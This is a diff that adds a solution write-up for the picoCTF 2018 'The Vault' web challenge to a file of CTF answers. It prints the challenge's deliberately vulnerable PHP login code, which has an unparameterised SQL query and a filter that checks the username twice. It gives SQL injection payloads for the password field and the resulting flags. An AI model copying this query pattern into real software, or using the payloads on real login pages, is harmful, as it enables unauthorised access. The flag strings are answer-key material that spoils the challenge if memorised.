@@ -56,6 +56,7 @@ you can't see me             General Skills   200     picoCTF{j0hn_c3na_paparapa
 Buttons                      Web              250     picoCTF{button_button_whose_got_the_button_ed306c10}
 Ext Super Magic              Forensics        250
 Lying Out                    Forensics        250     picoCTF{w4y_0ut_ff5bd19c}
+The Vault                    Web              250     picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258}
 absolutely relative          General Skills   250
 rsa-madlibs                  Cryptography     250
 in out error                 General Skills   275     picoCTF{p1p1ng_1S_4_7h1ng_b6f5a788}
@@ -1226,6 +1227,74 @@ Great job. You've earned the flag: picoCTF{w4y_0ut_ff5bd19c}
 **Flag**
 ```
 picoCTF{w4y_0ut_ff5bd19c}
+```
+
+### Web 250: The Vault
+
+**Challenge**
+
+ There is a website running at http://2018shell1.picoctf.com:64349 (link). Try to see if you can login!
+
+**Solution**
+
+we get the php source code
+
+```php
+<?php
+  ini_set('error_reporting', E_ALL);
+  ini_set('display_errors', 'On');
+
+  include "config.php";
+  $con = new SQLite3($database_file);
+
+  $username = $_POST["username"];
+  $password = $_POST["password"];
+  $debug = $_POST["debug"];
+  $query = "SELECT 1 FROM users WHERE name='$username' AND password='$password'";
+
+  if (intval($debug)) {
+    echo "<pre>";
+    echo "username: ", htmlspecialchars($username), "\n";
+    echo "password: ", htmlspecialchars($password), "\n";
+    echo "SQL query: ", htmlspecialchars($query), "\n";
+    echo "</pre>";
+  }
+
+  //validation check
+  $pattern ="/.*['\"].*OR.*/i";
+  $user_match = preg_match($pattern, $username);
+  $password_match = preg_match($pattern, $username);
+  if($user_match + $password_match > 0)  {
+    echo "<h1>SQLi detected.</h1>";
+  }
+  else {
+    $result = $con->query($query);
+    $row = $result->fetchArray();
+
+    if ($row) {
+      echo "<h1>Logged in!</h1>";
+      echo "<p>Your flag is: $FLAG</p>";
+    } else {
+      echo "<h1>Login failed.</h1>";
+    }
+  }
+
+?>
+
+```
+
+we enter anything for the username and `' or 1 --` or `' or 'x'='x` for the password to get the flag
+
+```
+Logged in!
+
+Your flag is: picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258}
+```
+
+
+**Flag**
+```
+picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258}
 ```
 
 ## General Skills 250: absolutely relative
